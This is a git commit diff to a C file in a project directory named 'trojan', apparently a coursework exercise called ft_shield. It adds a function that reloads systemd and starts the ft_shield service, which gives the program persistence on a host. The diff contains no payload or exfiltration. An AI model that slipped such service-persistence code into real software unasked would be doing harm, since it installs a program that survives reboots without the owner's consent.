b5d9ed29b96a645f2453690959962fa4e7690328
Arthur Bied-Charreton <arthurbiedchar@gmail.com>
2025-07-28 15:47:07 +0200

    Add start_service function to start the ft_shield service

--- src/trojan/main.c
+++ src/trojan/main.c
@@ -27,8 +27,33 @@ int configure_systemd() {
     return 0;
 }
 
-int main() {
+int
+start_service() {
+    // If the service was already running and the configuration changed, 'systemctl start' outputs a warning message.
+    // 'systemctl daemon-reload' prevents this by reloading units before starting ft_shield.
+    const char *reload_cmd = "systemctl daemon-reload";
+    if (system(reload_cmd) == -1) {
+        __log(stderr, "(system:%s) Error reloading systemctl: %s\n", reload_cmd, strerror(errno));
+        return -1;
+    }
+
+    const char *start_cmd = "systemctl start ft_shield";
+    if (system(start_cmd) == -1) {
+        __log(stderr, "(system:%s) Error starting ft_shield service: %s\n", start_cmd, strerror(errno));
+        return -1;
+    }
+    return 0;
+}
+
+int
+main() {
     __log(stdout, "DEBUG=1\n");
-    configure_systemd();
+    if (configure_systemd() == -1) {
+        return 1;
+    }
+    if (start_service() == -1) {
+        return 1;
+    }
+
     printf("abied-ch\n");
 }
